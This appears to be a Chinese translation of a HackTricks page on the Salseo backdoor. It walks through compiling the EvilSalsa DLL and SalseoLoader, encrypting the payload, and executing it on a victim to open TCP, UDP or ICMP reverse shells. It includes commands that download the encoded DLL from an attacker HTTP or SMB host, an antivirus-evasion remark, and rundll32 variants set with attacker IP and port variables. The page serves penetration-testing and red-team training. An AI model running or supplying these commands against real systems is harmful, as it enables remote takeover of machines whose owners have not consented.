# Salseo

{% hint style="success" %}
学习并练习AWS黑客：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习GCP黑客：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享黑客技巧。**

</details>
{% endhint %}

## 编译二进制文件

从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。您需要安装**Visual Studio**来编译代码。

为将要使用它们的Windows系统架构编译这些项目（如果Windows支持x64，请为该架构编译）。

您可以在Visual Studio中的**左侧"Build"选项卡**中的**"Platform Target"**中**选择架构**。

(\*\*如果找不到这些选项，请点击**"Project Tab"**，然后点击**"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

然后，构建这两个项目（Build -> Build Solution）（日志中将显示可执行文件的路径）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 准备后门

首先，您需要对**EvilSalsa.dll**进行编码。您可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
现在你已经拥有执行所有Salseo操作所需的一切：**编码的EvilDalsa.dll**和**SalseoLoader的二进制文件。**

**将SalseoLoader.exe二进制文件上传到机器上。它们不应该被任何杀毒软件检测到...**

## **执行后门**

### **获取TCP反向shell（通过HTTP下载编码的dll）**

记得启动一个nc作为反向shell监听器，以及一个HTTP服务器来提供编码的evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向shell（通过SMB下载编码的dll）**

记得启动一个nc作为反向shell监听器，并启动一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取 ICMP 反向 shell（已经在受害者内部编码的 dll）**

**这次您需要在客户端上使用一个特殊工具来接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用 ICMP 回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，让我们执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 编译SalseoLoader作为导出主函数的DLL

使用Visual Studio打开SalseoLoader项目。

### 在主函数之前添加：\[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 为此项目安装DllExport

#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **搜索DllExport包（使用浏览选项卡），然后按安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

在您的项目文件夹中会出现文件：**DllExport.bat** 和 **DllExport\_Configure.bat**

### **卸载DllExport**

点击 **卸载**（是的，这很奇怪，但相信我，这是必要的）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **退出Visual Studio并执行DllExport\_configure**

只需 **退出** Visual Studio

然后，转到您的 **SalseoLoader文件夹** 并 **执行DllExport\_Configure.bat**

选择 **x64**（如果您将在x64系统中使用它，这是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport的命名空间** 中）并按 **应用**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **再次使用Visual Studio打开项目**

**\[DllExport]** 不应再被标记为错误

![](<../.gitbook/assets/image (8) (1).png>)

### 构建解决方案

选择 **输出类型 = 类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型 = 类库）

![](<../.gitbook/assets/image (10) (1).png>)

选择 **x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标 = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

要 **构建** 解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）

### 测试生成的Dll

将Dll复制粘贴到要测试的位置。

执行：
```
rundll32.exe SalseoLoader.dll,main
```
如果没有出现错误，那么你可能有一个功能正常的DLL！！

## 使用DLL获取shell

不要忘记使用**HTTP** **服务器**并设置一个**nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD（Command Prompt）是Windows操作系统中的命令行界面。通过CMD，用户可以直接输入命令来与操作系统进行交互，执行各种操作，包括文件管理、网络配置、系统设置等。CMD也是许多后门和恶意软件用来执行命令并控制受感染系统的常见工具之一。
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
学习并练习AWS Hacking：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
